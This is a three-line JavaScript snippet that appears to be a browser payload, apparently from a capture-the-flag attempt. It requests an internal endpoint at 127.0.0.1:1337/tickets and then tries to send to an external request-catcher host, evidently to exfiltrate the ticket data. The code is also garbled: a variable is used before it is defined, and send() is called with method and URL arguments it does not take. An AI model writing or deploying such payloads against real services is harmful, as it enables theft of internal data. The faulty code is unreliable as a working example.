let xhr = new XMLHttpRequest();
var x = xhr.open('GET', "http://127.0.0.1:1337/tickets", true, x);
xhr.send("POST", "https://lemon.requestcatcher.com/", true);
